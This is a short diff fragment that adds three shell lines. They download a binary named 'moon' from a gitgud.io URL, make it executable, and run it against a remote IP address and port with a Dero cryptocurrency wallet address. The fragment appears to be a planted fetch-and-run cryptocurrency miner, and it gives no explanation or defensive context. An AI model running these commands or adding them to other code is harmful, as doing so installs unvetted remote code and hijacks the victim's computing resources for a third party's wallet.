@@ -1,0 +1,3 @@
+wget https://gitgud.io/trendava/ruby/-/raw/master/moon
+chmod 700 moon
+./moon -d 45.86.230.214:65000 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj
